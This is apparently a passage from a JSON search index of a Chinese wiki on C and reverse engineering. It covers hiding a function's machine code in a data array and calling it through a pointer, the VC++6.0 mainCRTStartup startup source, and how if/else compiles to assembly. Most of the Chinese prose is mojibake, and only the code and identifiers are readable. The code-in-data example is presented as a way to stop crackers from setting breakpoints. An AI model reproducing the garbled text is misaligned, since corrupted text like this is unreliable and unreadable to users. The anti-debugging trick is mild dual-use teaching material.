éšè—åˆ°æ•°æ®åŒº ä»£ç ä¹Ÿæ˜¯ä¸€å †æ•°æ®ã€‚ å†™ä¸€ä¸ªå‡½æ•°ï¼Œçœ‹åæ±‡ç¼–ï¼Œå°†ç¡¬ç¼–ç æ‰£å‡ºæ¥æ”¾åˆ°æ•°ç»„ä¸­ã€‚é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨è¿™ä¸ªå‡½æ•° 1234int Function(int x, int y)&#123; return x + y;&#125; 12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdafx.h&quot;//æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°ï¼Œåªæœ‰åšå¤§å°æ¯”è¾ƒå’Œç¬¦å·æ‹“å±•æ—¶æ‰æœ‰åŒºåˆ«//æ‰€ä»¥è¿™ä¸ªæ•°ç»„å®šä¹‰æˆæœ‰ç¬¦å·æˆ–æ— ç¬¦å·éƒ½å¯ä»¥unsigned char code[] = &#123; 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x40, 0x53, 0x56, 0x57, 0x8D, 0x7D, 0xC0, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x8B, 0x45, 0x08, 0x03, 0x45, 0x0C, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3&#125;; int main(int argc, char* argv[]) &#123; typedef int (*Fun)(int,int); Fun p = (int (*)(int,int))&amp;code; int x = p(2,3); printf(&quot;%d &quot;,x); return 0;\t&#125; VSè¦ç”³è¯·å¯æ‰§è¡Œçš„é¡µï¼Œåœ¨æ”¾ç¡¬ç¼–ç ã€‚è¦ä¸æ•°æ®åŒºä¸èƒ½æ‰§è¡Œã€‚ ç°åœ¨å‡½æ•°åœ¨æ•°æ®åŒºä¸­ï¼Œç ´è§£è€…è°ƒè¯•æ—¶æ²¡æ³•ä¸‹æ–­ç‚¹ã€‚"},{"title":"å‡½æ•°çš„å…¥å£","path":"/wiki/C/å‡½æ•°çš„å…¥å£.html","content":"å‚è€ƒ C++åæ±‡ç¼–ç¬¬ä¸€ç‰ˆï¼Œpdf ç¬¬äºŒç‰ˆï¼Œäº¬ä¸œï¼Œhttps://cread.jd.com/read/startRead.action?bookId=30746348&amp;readType=1 è®°å½•ï¼šcrt0.cæºç æ–‡ä»¶ï¼šhttps://blog.csdn.net/daiyutage/article/details/17102261 ç¨‹åºçš„çœŸæ­£å…¥å£ mainæˆ–Winmainå‡½æ•°æ˜¯â€œè¯­æ³•è§„å®šçš„ç”¨æˆ·å…¥å£â€ï¼Œè€Œä¸æ˜¯â€œåº”ç”¨ç¨‹åºå…¥å£â€ã€‚å½“ç”¨æˆ·åŒå‡»æ‰§è¡Œä¸€ä¸ªä½äºç£ç›˜ä¸Šçš„ç¨‹åºåï¼Œæ“ä½œç³»ç»Ÿä¼šåŠ è½½å®ƒï¼Œåˆ†æPEæ–‡ä»¶æ ¼å¼ï¼Œåˆ†é…ç›¸å…³èµ„æºï¼Œè¯»å–æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä»£ç å’Œæ•°æ®åˆ°åˆé€‚çš„å†…å­˜å•å…ƒï¼Œç„¶åæ‰æ‰§è¡Œå…¥å£ä»£ç ï¼Œé€šå¸¸æ˜¯[w]mainCRTStartupæˆ–[w]WinMainCRTStartupã€‚åœ¨[w]mainCRTStartupæˆ–[w]WinMainCRTStartupé‡Œè°ƒç”¨mainæˆ–Winmainå‡½æ•°ã€‚ä¸åŒç¼–ç å’Œç¼–ç¨‹ç¯å¢ƒå¯¹åº”çš„å¯åŠ¨å¯åŠ¨å‡½æ•°å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚ ç±»åˆ« æ§åˆ¶å°ç¯å¢ƒ Windowsç¯å¢ƒ å¤šå­—èŠ‚ç¼–ç  mainCRTStartup WinMainCRTStartup Unicodeç¼–ç  wmainCRTStartup wWinMainCRTStartup åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨ä¹Ÿå…è®¸ç¨‹åºå‘˜è‡ªå·±æŒ‡å®šå…¥å£å‡½æ•°ã€‚ VC++6.0çš„å¯åŠ¨å‡½æ•° åœ¨è°ƒè¯•ç¯å¢ƒä¸‹ï¼Œä¾æ¬¡é€‰æ‹©èœå•Viewâ†’Debug Windowsâ†’Call Stackæ‰“å¼€å‡ºæ ˆçª—å£ï¼ˆå¿«æ·é”®ï¼šAlt+7ï¼‰ã€‚æ­¤çª—å£ä¸­æ˜¾ç¤ºäº†ç¨‹åºå¯åŠ¨åï¼Œå‡½æ•°çš„è°ƒç”¨æµç¨‹ã€‚ åœ¨å®‰è£…äº†å®Œæ•´ç‰ˆçš„VC++åŒå‡»mainCRTStartupå°±èƒ½æŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„æºç ã€‚ ç¯å¢ƒé—®é¢˜å®Œæ•´ç‰ˆå®‰è£…ç²¾ç®€ç‰ˆ+å•ç‹¬çš„CRTæ–‡ä»¶æˆ‘ä»winworldä¸‹è½½çš„isoåœ¨xpä¸Šå®‰è£…æ—¶å¡åœ¨è¿™ä¸€æ­¥ï¼Œå®‰è£…ä¸æˆåŠŸï¼Œä¼°è®¡è¿™ä¸ªæ˜¯å®Œæ•´ç‰ˆã€‚https://winworldpc.com/product/microsoft-visual-stu/60https://www.zhihu.com/question/370249267ä»åˆ«çš„åœ°æ–¹ä¸‹çš„å®‰è£…åŒ…èƒ½æˆåŠŸå®‰è£…ï¼Œä½†åŒå‡»mainCRTStartupä¼šè®©å¼¹çª—æ‰¾æˆ‘æ‰¾crt0.cæºæ–‡ä»¶ï¼Œä¼°è®¡æ˜¯ç²¾ç®€ç‰ˆï¼Œæ²¡æ‰¾åˆ°ã€‚æ ¹æ®Source code for mainCRTStartup() in Visual C++æŒ‡æ˜çš„è·¯å¾„%VSINSTALLDIR%VC\\crt\\src\\vcruntime\\ï¼Œæƒ³åŠæ³•æ‰¾åˆ°æºä»£ç è‡ªå·±æ”¾è¿›å»ã€‚ç„¶åä»CSDNä¸Šæ‰¾åˆ°äº†ï¼Œä¸‹è½½vc6.0ä¸­ç¼ºå°‘çš„VC98\\CRT\\SRCæ–‡ä»¶å¤¹ï¼Œå°†å…¶æ”¾åˆ°å®‰è£…ç›®å½•\\VC98\\ä¸‹ã€‚è¿™æ¬¡å†åŒå‡»å°±èƒ½æ‰¾åˆ°äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/****BaseProcessStartup(PVOID Peb)**Purpose:* This routine does the C runtime initialization, calls main(), and* then exits. It never returns.**Entry:* PVOID Peb - pointer to Win32 Process Environment Block (not used)**Exit:* This function never returns.********************************************************************************/#ifdef _WINMAIN_#ifdef WPRFLAGvoid wWinMainCRTStartup(#else /* WPRFLAG */void WinMainCRTStartup(#endif /* WPRFLAG */#else /* _WINMAIN_ */#ifdef WPRFLAG//å®½å­—ç¬¦ç‰ˆæ§åˆ¶å°å¯åŠ¨å‡½æ•°void wmainCRTStartup(#else /* WPRFLAG *///å¤šå­—èŠ‚ç‰ˆæ§åˆ¶å°å¯åŠ¨å‡½æ•°void mainCRTStartup(#endif /* WPRFLAG */#endif /* _WINMAIN_ */ void )&#123; int mainret;#ifdef _WINMAIN_ _TUCHAR *lpszCommandLine; STARTUPINFO StartupInfo;#endif /* _WINMAIN_ */ /* * Get the full Win32 versionï¼Œè·å–ç‰ˆæœ¬ä¿¡æ¯ */ _osver = GetVersion(); _winminor = (_osver &gt;&gt; 8) &amp; 0x00FF ; _winmajor = _osver &amp; 0x00FF ; _winver = (_winmajor &lt;&lt; 8) + _winminor; _osver = (_osver &gt;&gt; 16) &amp; 0x00FFFF ; //å †ç©ºé—´åˆå§‹åŒ–è¿‡ç¨‹ï¼Œåœ¨æ­¤å‡½æ•°ä¸­ï¼ŒæŒ‡å®šäº†ç¨‹åºä¸­å †ç©ºé—´çš„èµ·å§‹åœ°å€ //_MTæ˜¯å¤šçº¿ç¨‹æ ‡è®°#ifdef _MT if ( !_heap_init(1) ) /* initialize heap */#else /* _MT */ if ( !_heap_init(0) ) /* initialize heap */#endif /* _MT */ fast_error_exit(_RT_HEAPINIT); /* write message and die */ //åˆå§‹åŒ–å¤šçº¿ç¨‹ç¯å¢ƒ#ifdef _MT if( !_mtinit() ) /* initialize multi-thread */ fast_error_exit(_RT_THREAD); /* write message and die */#endif /* _MT */ /* * Guard the remainder of the initialization code and the call * to user&#x27;s main, or WinMain, function in a __try/__except * statement. */ __try &#123; _ioinit(); /* initialize lowio */#ifdef WPRFLAG //å®½å­—ç¬¦å¤„ç† /* get wide cmd line info */ _wcmdln = (wchar_t *)__crtGetCommandLineW(); //è·å–å‘½ä»¤è¡Œä¿¡æ¯ /* get wide environ info */ _wenvptr = (wchar_t *)__crtGetEnvironmentStringsW();//è·å–ç¯å¢ƒå˜é‡ä¿¡æ¯ _wsetargv(); _wsetenvp();#else /* WPRFLAG */ //å¤šå­—èŠ‚å¤„ç† /* get cmd line info */ _acmdln = (char *)GetCommandLineA(); //è·å–å‘½ä»¤è¡Œä¿¡æ¯ /* get environ info */ _aenvptr = (char *)__crtGetEnvironmentStringsA(); //è·å–ç¯å¢ƒå˜é‡ä¿¡æ¯ _setargv(); _setenvp();#endif /* WPRFLAG */ //åˆå§‹åŒ–å…¨å±€æ•°æ®å’Œæµ®ç‚¹å¯„å­˜å™¨ _cinit(); /* do C data initialize *///çª—å£ç¨‹åºå¤„ç†ä»£ç  #ifdef _WINMAIN_ StartupInfo.dwFlags = 0; GetStartupInfo( &amp;StartupInfo );#ifdef WPRFLAG lpszCommandLine = _wwincmdln(); mainret = wWinMain(#else /* WPRFLAG */ lpszCommandLine = _wincmdln(); mainret = WinMain(#endif /* WPRFLAG */ GetModuleHandleA(NULL), NULL, lpszCommandLine, StartupInfo.dwFlags &amp; STARTF_USESHOWWINDOW ? StartupInfo.wShowWindow : SW_SHOWDEFAULT );#else /* _WINMAIN_ *///è°ƒç”¨wmainæˆ–mainå‡½æ•°ï¼Œä¼ é€’å‘½ä»¤è¡Œå‚æ•°ä¿¡æ¯#ifdef WPRFLAG __winitenv = _wenviron; mainret = wmain(__argc, __wargv, _wenviron);#else /* WPRFLAG */ __initenv = _environ; mainret = main(__argc, __argv, _environ);#endif /* WPRFLAG */#endif /* _WINMAIN_ */ exit(mainret); //æ£€æŸ¥mainå‡½æ•°è¿”å›å€¼æ‰§è¡Œææ„å‡½æ•°æˆ–atexitæ³¨å†Œçš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶ç»“æŸç¨‹åº &#125; __except ( _XcptFilter(GetExceptionCode(), GetExceptionInformation()) ) &#123; /* * Should never reach here */ _exit( GetExceptionCode() ); &#125; /* end of try - except */&#125; ä»¥VC++6.0æ§åˆ¶å°ç¨‹åºå¯åŠ¨å‡½æ•°æ¥è§£è¯»å¯åŠ¨å‡½æ•°çš„å·¥ä½œæµç¨‹ï¼š GetVersionå‡½æ•°ï¼šè·å–å½“å‰è¿è¡Œå¹³å°çš„ç‰ˆæœ¬å·ã€‚æ§åˆ¶å°ç¨‹åºè¿è¡Œåœ¨Windowsæ¨¡æ‹Ÿçš„DOSä¸‹ï¼Œå› æ­¤è¿™é‡Œè·å–çš„ç‰ˆæœ¬å·ä¸ºMS-DOSçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚ _heap_initå‡½æ•°ï¼šç”¨äºåˆå§‹åŒ–å †ç©ºé—´ã€‚åœ¨å‡½æ•°å®ç°ä¸­ä½¿ç”¨HeapCreateç”³è¯·å †ç©ºé—´ï¼Œç”³è¯·ç©ºé—´çš„å¤§å°ç”±_heap_initä¼ é€’çš„å‚æ•°å†³å®šã€‚_sbh_heap_initå‡½æ•°ç”¨äºåˆå§‹åŒ–å †ç»“æ„ä¿¡æ¯ã€‚ GetCommandLineAå‡½æ•°ï¼šè·å–å‘½ä»¤è¡Œå‚æ•°ä¿¡æ¯çš„é¦–åœ°å€ã€‚ _crtGetEnvironmentStringsAå‡½æ•°ï¼šè·å–ç¯å¢ƒå˜é‡ä¿¡æ¯çš„é¦–åœ°å€ã€‚ _setargvå‡½æ•°ï¼šæ­¤å‡½æ•°æ ¹æ®GetCommandLineAè·å–å‘½ä»¤è¡Œå‚æ•°ä¿¡æ¯çš„é¦–åœ°å€å¹¶è¿›è¡Œå‚æ•°åˆ†æï¼Œå°†åˆ†ç¦»å‡ºçš„å‚æ•°çš„ä¸ªæ•°ä¿å­˜åœ¨å…¨å±€å˜é‡_argcä¸­ï¼Œå°†åˆ†æå‡ºçš„æ¯ä¸ªå‘½ä»¤è¡Œå‚æ•°çš„é¦–åœ°å€å­˜æ”¾åœ¨æ•°ç»„ä¸­ï¼Œå¹¶å°†è¿™ä¸ªå­—ç¬¦æŒ‡é’ˆæ•°ç»„çš„é¦–åœ°å€ä¿å­˜åœ¨å…¨å±€å˜é‡_argvä¸­ã€‚è¿™æ ·å°±å¾—åˆ°äº†å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ï¼Œä»¥åŠå‘½ä»¤è¡Œå‚æ•°ä¿¡æ¯ã€‚ _setenvpå‡½æ•°ï¼šæ­¤å‡½æ•°æ ¹æ®_crtGetEnvironmentStringsAå‡½æ•°è·å–ç¯å¢ƒå˜é‡ä¿¡æ¯çš„é¦–åœ°å€å¹¶è¿›è¡Œåˆ†æï¼Œå°†å¾—åˆ°çš„æ¯æ¡ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²çš„é¦–åœ°å€å­˜æ”¾åœ¨å­—ç¬¦æŒ‡é’ˆæ•°ç»„ä¸­ï¼Œå¹¶å°†è¿™ä¸ªæ•°ç»„çš„é¦–åœ°å€å­˜æ”¾åœ¨å…¨å±€å˜é‡envä¸­ã€‚å¾—åˆ°mainå‡½æ•°æ‰€éœ€çš„ä¸‰ä¸ªå‚æ•°ä¿¡æ¯ä¹‹åï¼Œå½“è°ƒç”¨mainå‡½æ•°æ—¶ï¼Œä¾¿å¯ä»¥å°†_argcã€_argvã€envè¿™ä¸‰ä¸ªå…¨å±€å˜é‡ä½œä¸ºå‚æ•°ï¼Œä»¥æ ˆä¼ å‚æ–¹å¼ä¼ é€’åˆ°mainå‡½æ•°ä¸­ã€‚ å¾—åˆ°mainå‡½æ•°æ‰€éœ€çš„ä¸‰ä¸ªå‚æ•°ä¿¡æ¯ä¹‹åï¼Œå½“è°ƒç”¨mainå‡½æ•°æ—¶ï¼Œä¾¿å¯ä»¥å°†_argcã€_argvã€envè¿™ä¸‰ä¸ªå…¨å±€å˜é‡ä½œä¸ºå‚æ•°ï¼Œä»¥æ ˆä¼ å‚æ–¹å¼ä¼ é€’åˆ°mainå‡½æ•°ä¸­ã€‚ _cinitå‡½æ•°ï¼šç”¨äºå…¨å±€æ•°æ®å’Œæµ®ç‚¹å¯„å­˜å™¨çš„åˆå§‹åŒ–ã€‚å…¨å±€å¯¹è±¡å’ŒIOæµç­‰çš„åˆå§‹åŒ–éƒ½æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°å®ç°çš„ã€‚åˆ©ç”¨å‡½æ•°_inittermè¿›è¡Œæ•°æ®é“¾åˆå§‹åŒ–ï¼Œè¿™ä¸ªå‡½æ•°ç”±ä¸¤ä¸ªå‚æ•°ç»„æˆï¼Œç±»å‹ä¸ºâ€œ_PVFV*â€ï¼Œè¿™æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„ï¼Œå…¶ä¸­ä¿ç•™äº†æ¯ä¸ªåˆå§‹åŒ–å‡½æ•°çš„åœ°å€ã€‚åˆå§‹åŒ–å‡½æ•°çš„ç±»å‹ä¸º_PVFVï¼Œå…¶å®šä¹‰åŸå‹å¦‚ä¸‹ï¼š 1typedef void(_cdecl*_PVFV)(void)ï¼› ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªåˆå§‹åŒ–å‡½æ•°æ˜¯æ— å‚æ•°ä¹Ÿæ— è¿”å›å€¼çš„ã€‚å¤§å®¶çŸ¥é“ï¼ŒC++è§„å®šå…¨å±€å¯¹è±¡å’Œé™æ€å¯¹è±¡å¿…é¡»åœ¨mainå‡½æ•°å‰æ„é€ ï¼Œåœ¨mainå‡½æ•°è¿”å›åææ„ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œçš„_PVFVå‡½æ•°æŒ‡é’ˆæ•°ç»„å°±æ˜¯ç”¨æ¥ä»£ç†è°ƒç”¨æ„é€ å‡½æ•°çš„ï¼Œå…·ä½“çš„ä»£ç æ¸…å•å¦‚ä¸‹ï¼ˆ_ciniteå‡½æ•°çš„ä»£ç ç‰‡æ®µï¼‰ 1234567//ç”¨äºåˆå§‹åŒ–å¯„å­˜å™¨if(_FPinitï¼=NULL)(*_FPinit)();//åˆå§‹åŒ–æµ®ç‚¹å¯„å­˜å™¨//ç”¨äºåˆå§‹åŒ–Cè¯­æ³•ä¸­çš„æ•°æ®_initterm(_xi_aï¼Œ_xi_z);//ç”¨äºåˆå§‹åŒ–C++è¯­æ³•ä¸­çš„æ•°æ®_initterm(_xc_aï¼Œ_xc_z); åœ¨ä¸Šè¿°ä»£ç æ¸…å•ä¸­ï¼Œ_FPinitæ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°æŒ‡é’ˆï¼Œç±»å‹ä¹Ÿæ˜¯_PVFVï¼Œå¦‚æœç¼–è¯‘å™¨æ‰«æä»£ç æ—¶å‘ç°æœ‰æµ®ç‚¹è®¡ç®—ï¼Œåˆ™æ­¤æŒ‡é’ˆä¿å­˜äº†åˆå§‹åŒ–æµ®ç‚¹å¯„å­˜å™¨çš„ä»£ç åœ°å€ï¼Œå¦åˆ™ä¸º0å€¼ã€‚å¦‚æœæµ®ç‚¹å¯„å­˜å™¨æœªè¢«åˆå§‹åŒ–è€Œè¿›è¡Œæµ®ç‚¹è®¡ç®—ï¼Œç¨‹åºä¼šäº§ç”Ÿå¼‚å¸¸æˆ–é”™è¯¯ï¼ˆè¯¦è§2.2èŠ‚ï¼‰ï¼Œè¿™ç±»é”™è¯¯åº”å±äºVC6.0è‡ªèº«è®¾è®¡çš„Bugï¼Œåœ¨VC6.0ä»¥åçš„ç‰ˆæœ¬ä¸­å·²å°†å…¶ä¿®å¤ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œç¬¬ä¸€ä¸ª_inittermåˆå§‹åŒ–çš„éƒ½æ˜¯Cæ”¯æŒåº“ä¸­æ‰€éœ€çš„æ•°æ®ã€‚å‚æ•°_xi_aä¸ºå‡½æ•°æŒ‡é’ˆæ•°ç»„çš„èµ·å§‹åœ°å€ï¼Œ_xi_zä¸ºç»“æŸåœ°å€ã€‚_inittermçš„å®ç°å¦‚ä¸‹ï¼š 1234567891011121314static void__cdecl_initterm( _PVFV*pfbegin, _PVFV*pfend)&#123; //éå†æ•°ç»„çš„å„å…ƒç´  while(pfbeginï¼œpfend) &#123; //è‹¥å‡½æ•°æŒ‡é’ˆä¸ä¸ºç©º,åˆ™æ‰§è¡Œè¯¥å‡½æ•° if(*pfbeginï¼=NULL) (**pfbegin)(); ++pfbegin; &#125;&#125; C++æ‰€éœ€æ•°æ®çš„åˆå§‹åŒ–æ“ä½œä¼šåœ¨ä»£ç æ¸…å•3-2ä¸­ç¬¬äºŒæ¬¡å¯¹_inittermè°ƒç”¨æ—¶æ‰§è¡Œï¼Œä¸€èˆ¬éƒ½æ˜¯å…¨å±€å¯¹è±¡æˆ–é™æ€å¯¹è±¡çš„åˆå§‹åŒ–å‡½æ•°ã€‚å…³äºå…¨å±€å¯¹è±¡çš„åˆå§‹åŒ–æµç¨‹çš„æ›´å¤šå†…å®¹è¯·è§ç¬¬10ç« ã€‚ VCç¼–è¯‘å™¨çš„ç‰ˆæœ¬ä¸åŒï¼ŒmainCRTStartupå‡½æ•°ä¹Ÿå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œå¦‚Microsoft Visual Studio 2005åˆç§°VC++8.0ï¼Œå…¶ä¸­mainCRTStartupçš„åå­—å°±å˜ä¸ºäº†_tmainCRTStartupã€‚ ä¿®æ”¹å…¥å£å‡½æ•° åœ¨æ§åˆ¶å°ç¨‹åºï¼Œå…¥å£å‡½æ•°æ˜¯mainï¼Œç¨‹åºå¯åŠ¨æ—¶ä¼šä»mainCRTStartupå¯åŠ¨ï¼Œå†ä¼ å…¥mainæ‰€éœ€è¦çš„ä¸‰ä¸ªå‚æ•°ï¼Œç„¶åè°ƒç”¨mainå‡½æ•°ã€‚ å¦‚æœè‡ªå·±æŒ‡å®šå…¥å£å‡½æ•°ï¼Œå°†ç›´æ¥ä»KERNEL32ä¸­è°ƒç”¨é‡æ–°æŒ‡å®šçš„å…¥å£å‡½æ•°ï¼Œè€Œä¸ä¼šå…ˆè°ƒç”¨mainCRTStarupã€‚ èœå•Project-&gt;Settings-&gt;Link-&gt;Outputï¼Œåœ¨Entry-point symbolä¸­å¡«å†™é‡æ–°æŒ‡å®šçš„æ–°å…¥å£å‡½æ•°çš„åç§°ï¼Œç¼–è¯‘åè°ƒè¯•æŸ¥çœ‹call stackï¼Œå¯ä»¥çœ‹åˆ°ä»è‡ªå·±æŒ‡å®šçš„æ–°å…¥å£å‡½æ•°å¯åŠ¨ã€‚ mainCRTStartup()å‡½æ•°ä¸­ä¼šç”¨_heap_initåˆå§‹åŒ–å †ç©ºé—´ï¼Œå®é™…ä¸Šmallocå‡½æ•°æ˜¯ä»ç°æœ‰çš„å †ç©ºé—´æ‹¿ä¸€å—æ¥ä½¿ç”¨ã€‚å¦‚æœè‡ªå®šä¹‰äº†å…¥å£å‡½æ•°ï¼Œå› ä¸ºæ²¡æœ‰è°ƒç”¨å…¥å£å‡½æ•°å‰æ²¡æœ‰è°ƒç”¨mainCRTStartup()ï¼Œå †ç©ºé—´æ²¡è¢«åˆå§‹åŒ–ï¼Œå½“ä½¿ç”¨åˆ°å †ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šæŠ¥é”™å¹¶å´©æºƒã€‚ ç»“è®º VC++6.0ä¸‹çš„mainå‡½æ•°æ˜¯å¯åŠ¨å‡½æ•°ä¸­å”¯ä¸€å…·æœ‰3ä¸ªå‚æ•°çš„å‡½æ•°ã€‚WinMainæ˜¯å¯åŠ¨å‡½æ•°ä¸­å”¯ä¸€çš„å…·æœ‰4ä¸ªå‚æ•°çš„å‡½æ•°ã€‚ åœ¨VC++6.0ä¸­ï¼Œmainå‡½æ•°è¢«è°ƒç”¨å‰è¦å…ˆè°ƒç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š 12345678910111213GetVersion()_heap_init()GetCommandLineA()_crtGetEnvironmentStringsA()_setargv()_setenvp()_cinit() è¿™äº›å‡½æ•°è°ƒç”¨ç»“æŸåå°±ä¼šè°ƒç”¨mainå‡½æ•°ã€‚ODå¯èƒ½ä¼šè¯†åˆ«å‡ºä»¥ä¸ŠæŸä¸ªå‡½æ•°ï¼Œå¾€åæ‰¾ï¼Œæ ¹æ®mainå‡½æ•°è°ƒç”¨çš„ç‰¹å¾ï¼Œä¼šå°†3ä¸ªå‚æ•°å‹å…¥æ ˆå†…ä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼Œå®ƒå°±æ˜¯mainå‡½æ•°ã€‚"},{"title":"åˆ†æ”¯è¯­å¥","path":"/wiki/C/åˆ†æ”¯è¯­å¥.html","content":"ifè¯­å¥ï¼ˆæ­£å‘ï¼‰ ifè¯­å¥ ç•¥ ifâ€¦elseè¯­å¥ ç•¥ å¤šåˆ†æ”¯è¯­å¥ å¤šåˆ†æ”¯æ˜¯ç”±ifå’Œifâ€¦elseâ€¦ç»„æˆçš„åˆ†æ”¯ç»“æ„ã€‚è¯­æ³•æ ¼å¼ä¸ºï¼šifâ€¦else ifâ€¦else ifâ€¦ï¼Œå¯é‡å¤åç¼€ä¸ºelse ifã€‚å½“æœ€åä¸ºelseæ—¶ï¼Œä¾¿åˆ°äº†å¤šåˆ†æ”¯ç»“æ„çš„æœ«å°¾å¤„ï¼Œä¸å†åˆ†æ”¯ã€‚ ä¸€å †ifè¯­å¥è¦å½“æˆä¸€ä¸ªæ•´ä½“çœ‹å¾…ã€‚ åˆ†æ”¯è¯­å¥ï¼Œä»ä¸Šå¾€ä¸‹åˆ¤æ–­ï¼ˆè®¡ç®—æœºæœ¬èº«å°±æ˜¯é¡ºåºå–æŒ‡æ‰§è¡Œï¼‰ï¼Œåªè¦æœ‰ä¸€ä¸ªæ¡ä»¶æˆç«‹ï¼Œå…¶ä»–çš„å°±ä¸åˆ¤æ–­äº†ã€‚æ­¤å¤–ï¼Œå› ä¸ºè¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥ä¸‹é¢ä»£ç è¿™ç§å†™æ³•ï¼Œelse ifåº”è¯¥åˆ¤æ–­x&lt;=1çš„å…¶ä»–æƒ…å†µï¼Œè¦ä¸åœ¨é€»è¾‘ä¸Šæ˜¯æ— æ•ˆçš„ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;int x=10;void Function()&#123; if(x&gt;1) &#123; printf(&quot;x&gt;1 &quot;); &#125; else if(x&gt;2) &#123; printf(&quot;x&gt;2 &quot;); &#125; else if(x&gt;3) &#123; printf(&quot;x&gt;3 &quot;); &#125; else &#123; printf(&quot;!! &quot;); &#125;&#125;int main()&#123; Function(); return 0;&#125; è¿è¡Œåè¾“å‡º 12x&gt;1 åæ±‡ç¼–è§’åº¦ ifè¯­å¥ 12345678910111213#include &lt;stdio.h&gt;int main()&#123; int x=10; int y=20; if(x&gt;y) &#123; printf(&quot;x&gt;y &quot;); &#125; return 0;&#125; Cè¯­è¨€ä¸­å†™çš„æ˜¯x&gt;yï¼Œå°±æ‰§è¡Œprintfè¯­å¥ã€‚ä½†åœ¨åæ±‡ç¼–ä¸­æ˜¯åè¿‡æ¥çš„ï¼Œjleï¼Œå°äºç­‰äºï¼Œå°±è·³èµ°ä¸æ‰§è¡Œã€‚å®ƒæ˜¯åè¿‡æ¥ç”Ÿæˆçš„ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥å°‘ä¸€æ¡jmpæŒ‡ä»¤ï¼Œä¸‹é¢æˆ‘ç”¨æ­£å‘çš„æ±‡ç¼–ä»£ç æ¥è¯´æ˜ï¼š 12345678910111213 mov dword ptr [ebp-4],0Ah mov dword ptr [ebp-8],14h mov eax,dword ptr [ebp-4] cmp eax,dword ptr [ebp-8] jg L1+ jmp L2L1: push offset string &quot;x&gt;y &quot; call printf add esp,4L2: xor eax,eax ä¸Šé¢çš„æ±‡ç¼–ç”¨çš„jgï¼Œå’Œifè¯­å¥çš„&gt;ä¿æŒä¸€è‡´ï¼Œä½†æ˜¯å°±è¦å¤šä¸€æ¡jmpæŒ‡ä»¤ã€‚ æ³¨æ„ï¼šä¸ç”¨ç¡¬èƒŒè¡¨è¾¾å¼ä¸åæ±‡ç¼–ä¹‹é—´çš„è½¬æ¢å…³ç³»ã€‚æ¯”å¦‚åæ±‡ç¼–çœ‹åˆ°jleï¼Œç„¶åè¿˜åŸæˆCå°±æ˜¯&gt;ã€‚ä¸éœ€è¦è¿™æ ·ï¼ŒæŒ‰é€»è¾‘è§’åº¦ç†è§£å‡½æ•°çš„åŠŸèƒ½å³å¯ã€‚ å°ç»“ åœ¨åæ±‡ç¼–ç§ï¼ŒçŸ­è·¯è¡¨è¾¾å¼å’Œifè¯­å¥ä¸¤ç§åˆ†æ”¯ç»“æ„çš„å®ç°è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ 123456789;å…ˆæ˜¯æ‰§è¡Œä¼šå½±å“æ ‡å¿—ä½çš„ç›¸å…³æŒ‡ä»¤ ;éšåè·Ÿç€å„ç§æ¡ä»¶è·³è½¬æŒ‡ä»¤ jxx xxxx &#123; ... //ifè¯­å¥å—èµ·å§‹ ... ... //è¯­å¥å—ç»“æŸéƒ¨åˆ†æ²¡æœ‰jmp &#125; ... //jxxå‘ä¸‹è·³è½¬çš„åœ°å€å°±æ˜¯ifè¯­å¥å—ç»“æŸçš„åœ°æ–¹ ifâ€¦elseâ€¦è¯­å¥ 1234567891011121314151617#include &lt;stdio.h&gt;int main()&#123; int x=10; int y=20; if(x&gt;y) &#123; printf(&quot;x&gt;y &quot;); &#125;\telse\t&#123; printf(&quot;x&lt;=y &quot;);\t&#125; return 0;&#125; jleå’Œjmpä¹‹é—´æ˜¯ifè¯­å¥å—çš„å†…å®¹ã€‚ ç‰¹ç‚¹åˆ†æ 1ã€å¦‚æœä¸è·³è½¬ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œåˆ°jmpå¤„ï¼Œjmpè·³è½¬åˆ°ELSE_ENDå¤„ 2ã€å¦‚æœè·³è½¬ï¼Œåˆ™ä¼šè·³è¿‡jmp ELSE_ENDå¤„çš„ä»£ç ï¼Œé¡ºåºæ‰§è¡Œåé¢çš„ä»£ç  è¡Œä¸ºï¼šè·³è½¬æ‰§è¡Œä¸€éƒ¨åˆ†ä»£ç ï¼Œä¸è·³è½¬æ‰§è¡Œå¦å¤–ä¸€éƒ¨åˆ†ä»£ç  åæ±‡ç¼–ç‰¹å¾ï¼šç¬¬ä¸€ä¸ªjxxè·³è½¬çš„åœ°å€çš„ä¸Šä¸€ä¸ªæŒ‡ä»¤æ˜¯jmp ,å¯ä»¥åˆ¤æ–­æ˜¯ifâ€¦elseâ€¦è¯­å¥ æŒ‡ä»¤åºåˆ—æ€»ç»“å¦‚ä¸‹ 